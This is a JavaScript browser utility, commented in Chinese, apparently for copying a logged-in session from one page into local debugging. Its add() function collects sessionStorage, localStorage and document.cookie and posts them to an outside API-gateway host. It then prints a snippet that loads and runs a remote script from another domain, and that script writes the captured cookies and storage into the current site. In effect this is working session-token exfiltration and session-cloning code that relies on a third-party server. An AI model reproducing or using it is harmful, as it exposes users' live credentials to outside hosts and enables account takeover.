//obj ：{method:"get",url:"",data:{}};
/**
 * 拼接对象为请求字符串
 * @param {Object} obj - 待拼接的对象
 * @returns {string} - 拼接成的请求字符串
 */
function encodeSearchParams(obj) {
	var params = []

	Object.keys(obj).forEach((key) => {
		let value = obj[key]
		// 如果值为undefined我们将其置空
		if (typeof value === 'undefined') {
			value = ''
		}
		// 对于需要编码的文本（比如说中文）我们要进行编码
		params.push([key, encodeURIComponent(value)].join('='))
	})
	return params.join('&')
}

function httpRequest(obj, successfun, errFun) {
	var xmlHttp = null;
	//创建 XMLHttpRequest 对象，老版本的 Internet Explorer （IE5 和 IE6）使用 ActiveX 对象：xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")
	if (window.XMLHttpRequest) {
		//code for all new browsers
		xmlHttp = new XMLHttpRequest;
	} else if (window.ActiveXObject) {
		//code for IE5 and IE6
		xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	//判断是否支持请求
	if (xmlHttp == null) {
		alert("浏览器不支持xmlHttp");
		return;
	}
	//请求方式， 转换为大写
	var httpMethod = (obj.method || "Get").toUpperCase();
	//数据类型
	var httpDataType = obj.dataType || 'json';
	//url
	var httpUrl = obj.url || '';
	//异步请求
	var async = true;
	//post请求时参数处理
	if (httpMethod == "POST") {
		//请求体中的参数 post请求参数格式为：param1=test&param2=test2
		var data = obj.data || {};
		var requestData = data;
	}
	//onreadystatechange 是一个事件句柄。它的值 (state_Change) 是一个函数的名称，当 XMLHttpRequest 对象的状态发生改变时，会触发此函数。状态从 0 (uninitialized) 到 4 (complete) 进行变化。仅在状态为 4 时，我们才执行代码
	xmlHttp.onreadystatechange = function () {
		//complete
		if (xmlHttp.readyState == 4) {
			if (xmlHttp.status == 200) {
				//请求成功执行的回调函数
				successfun(xmlHttp.responseText);
			} if (xmlHttp.status == 204) {
				//请求成功执行的回调函数
				successfun(xmlHttp.responseText);
			} else {
				//请求失败的回调函数
				errFun;
			}
		}
	}
	//请求接口
	if (httpMethod == 'GET') {
		xmlHttp.open("GET", httpUrl, async);
		xmlHttp.send(null);
	} else if (httpMethod == "POST") {
		xmlHttp.open("POST", httpUrl, async);
		xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xmlHttp.send(requestData);
	}
}
function add() {
	var mun = new Date().getTime();
	var sjson = {
		sessionStorage: window.sessionStorage,
		localStorage: window.localStorage,
		cookie: document.cookie,
	};
	httpRequest({
		method: "post",
		url: "//service-dedfszk5-1251555445.sh.apigw.tencentcs.com/release/p?key="+ mun,//请求的url地址
		data: JSON.stringify(sjson)
	}, function (res) {
		console.log("获取成功，请复制下面代码，到本地调试中粘贴执行");
		console.log('function loadJs(url,callback){var script=document.createElement("script");script.type="text/javascript";if(typeof(callback)!="undefined"){if(script.readyState){script.onreadystatechange=function(){if(script.readyState=="loaded"||script.readyState=="complete"){script.onreadystatechange=null;callback()}}}else{script.onload=function(){callback()}}}script.src=url;document.body.appendChild(script)}loadJs("//api.1996wz.cn/html/js/auto.js",()=>{get("' + mun + '")})')
	}, function () {
		console.log("请求失败");
	});
}

function get(key) {
	httpRequest({
		method: "post",
		url: "//service-dedfszk5-1251555445.sh.apigw.tencentcs.com/release/p?isget=12&key=" + key,//请求的url地址
		data: {
		}
	}, function (sjson) {
		if(sjson === '数据已被删除、请重新复制'){
			console.log(sjson)
			return 
		}
		sjson = JSON.parse(sjson);
		if (sjson["sessionStorage"]) {
			Object.keys(sjson.sessionStorage).forEach((key) => {
				let value = sjson.sessionStorage[key]
				// 对于需要编码的文本（比如说中文）我们要进行编码
				sessionStorage.setItem(key, value);
			})
		}
		if (sjson.localStorage) {
			Object.keys(sjson.localStorage).forEach((key) => {
				let value = sjson.localStorage[key]
				// 对于需要编码的文本（比如说中文）我们要进行编码
				localStorage.setItem(key, value);
			})
		}
		if (sjson.cookie) {
			var href = window.location.href.split("/")[2].split(":")[0]
		
			var cookies = sjson.cookie.split(";")
			if (cookies && cookies.length) {
				cookies.forEach(e => {
					document.cookie = e.replace(/(^\s*)|(\s*$)/g, "") + ";  domain=" + href + "; path=/;";
				})
			}
		}	
		console.log("写入成功,请刷新页面");
	}, function () {
		console.log("请求失败");
	});
}
